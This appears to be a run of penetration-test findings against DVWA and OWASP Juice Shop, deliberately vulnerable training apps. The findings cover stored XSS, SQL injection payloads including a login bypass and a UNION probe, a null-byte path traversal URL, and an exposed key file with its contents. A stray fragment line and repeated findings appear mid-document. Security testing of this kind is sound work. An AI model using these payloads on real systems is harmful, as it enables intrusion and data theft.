findings.title: Stored XSS in DVWA guestbook message field [security=low]
request_sequence: POST /security.php security=low seclev_submit=Submit user_token=[REDACTED] (set level to low; 302)
GET /security.php (page reports 'Security level is currently: low')
findings.response_evidence: [security=low] Re-submitted canary after explicitly setting level to low (page text: 'Security level set to low', 'Security Level: low'). Stored response echoes 'Name: vrfy Message: window.xss_flag=1' (tag stored raw, 50 chars, fits maxlength). Rendering page loaded in headless browser shows the stored entry; browser_eval_js returned window.xss_flag = '1' and element #test_token present in DOM, proving the stored <script> executed on page render. Note: an earlier submission made while the server reported 'Security Level: high' had the tags stripped (rendered as plain text) and was NOT used as evidence; the valid test was rerun at low.
findings.browser_js_evidence: window.xss_flag evaluated to "1" (result: "1 | token=[REDACTED]") on http://dvwa/vulnerabilities/xss_s/ as dvwa_admin at security=low.

findings.title: DVWA security-level control endpoint (/security.php) - not a verifiable vulnerability class in scope
request_sequence: GET /security.php -> 200, 'Security level is currently: low', new user_token=[REDACTED]
findings.response_evidence: The endpoint is DVWA's level-setting control, not one of the assigned vulnerability classes (SQLi, cmd injection, stored XSS, BOLA, etc.), so no behavioral exploit criterion applies. Observed behavior: the level change requires a valid user_token (CSRF token rotates on each load), and a POST with the current token changes the level (302, then page reads 'Security level is currently: low'). Note the level is an authoritative server-side state: a GET observed 'Security Level: high' in the page body while the tool's session_info still said 'low', so session_info security_level metadata is not reliable and was not trusted. Not submitted as confirmed because a token-protected level change is expected behavior, not a demonstrated access-control bypass. Coordinator may return it for a CSRF-protection check if that class is in scope.

findings.title: DVWA SQL Injection (numeric POST id) [security=medium]
request_sequence: POST http://dvwa/security.php security=medium&seclev_submit=Submit&user_token=[REDACTED] (dvwa_admin) -> 302; subsequent GET shows 'Security level is currently: medium'
POST http://dvwa/vulnerabilities/sqli/ id=1 OR 1=1&Submit=Submit (dvwa_admin, security=medium) -> TRUE
POST http://dvwa/vulnerabilities/sqli/ id=1 AND 1=2&Submit=Submit (dvwa_admin, security=medium) -> FALSE
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' HTTP 200 returned 5 user records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id='1 AND 1=2' HTTP 200 returned zero records (only the 'User ID: 1 2 3 4 5' header, no 'First name/Surname' rows). Page footer reports 'Security Level: medium'. Note: the tool's session_info field still reported 'low' while the page itself reported medium; the page content was treated as authoritative.

findings.title: DVWA security-level control endpoint (/security.php) access check
findings.response_evidence: The level-change POST by the authenticated admin session was accepted (follow-up GET shows 'Security level is currently: medium'). An unauthenticated GET to /security.php is redirected to login.php (HTTP 302), so the page enforces authentication. The endpoint is a configuration control rather than one of the in-scope vulnerability classes (SQLi/CMDi/XSS-stored); no unauthorized level change was demonstrated. Unauthenticated POST was not tested, so CWE-284 is inconclusive. Current DVWA level left at medium. Token rotates per request; CSRF token enforcement not tested.

"dependencies": {...}'. Confirms the extension filter is bypassed and a .bak file is served.

findings.title: Poison Null-Byte Path Traversal bypasses /ftp/ .bak extension filter
findings.response_evidence: Control: GET /ftp/package.json.bak -> HTTP 403 body 'Error: Only .md and .pdf files are allowed!' (fileServer.js verify). Bypass: GET /ftp/package.json.bak%2500.md -> HTTP 200, content-type application/octet-stream, body begins '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}' i.e. the restricted backup file content was returned without authentication.

findings.title: Exposed Encryption-Keys Directory with browsable listing (jwt.pub, premium.key)
findings.response_evidence: HTTP 200 text/html. Body: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. findings.title: Login authentication bypass via SQL injection in email field
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid auth token was issued for the first user (admin@juice-sh.op) with an arbitrary password, proving the email value is concatenated into the SQL WHERE clause.

findings.title: Product search SQL injection (error-based and UNION-based) via q parameter
findings.response_evidence: Quote probe: HTTP 500 text/html body 'Error: SQLITE_ERROR: near "'%'": syntax error' (SQL error leaked). UNION probe: HTTP 200 application/json {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} – the injected column values 2..9 are reflected in the product fields, confirming attacker-controlled UNION SELECT into the query.

findings.title: Unauthenticated user-feedback listing exposes partially masked author emails
findings.response_evidence: HTTP 200 without authentication, 8 records. Fields: UserId, id, comment, rating, createdAt, updatedAt. Author emails appear only partially masked inside comment text, e.g. "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)". Anonymous records have UserId null and "(anonymous)". No full author email address is returned in any field. The criterion requires disclosure of author email addresses, and only masked fragments with the domain are present, so the finding is not confirmed. Unauthenticated access to UserId values and partial email fragments remains a weakness worth reporting as lower severity.

findings.title: Exposed encryption-keys directory is browsable and serves premium.key
findings.response_evidence: GET /encryptionkeys/ returned HTTP 200 text/html with a directory listing: "listing directory /encryptionkeys/ ... Name Size Modified jwt.pub 248 ... premium.key 50 ...". Links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key are present. GET /encryptionkeys/premium.key returned HTTP 200 application/octet-stream with body "1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42". Both the directory is browsable and the sensitive key files (premium.key, jwt.pub) are exposed without authentication.

findings.title: Unauthenticated access to user feedback records with partially masked author email PII
findings.response_evidence: HTTP 200 application/json without any authentication: {"status":"success","data":[{"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)","rating":5,...},{"UserId":2,"id":2,"comment":"Great shop! Awesome service! (***@juice-sh.op)",...},{"UserId":3,...,"comment":"Nothing useful available here! (***der@juice-sh.op)",...},{"UserId":21,...,"comment":"...(***ereum@juice-sh.op)",...},{"UserId":null,...,"comment":"... (anonymous)"} ...] (8 records total). Unauthenticated access to the full feedback collection is confirmed, and UserId values are exposed. However, author email addresses are only partially masked (local-part replaced by *** and only a fragment of the address/domain shown). Full author email addresses are NOT disclosed in this response, so the PII-disclosure criterion is only partially met. Recommend the Coordinator decide whether partial-mask email fragments plus linkable UserId constitute reportable CWE-359 exposure; a follow-up on related user endpoints would be out of this assignment's scope.
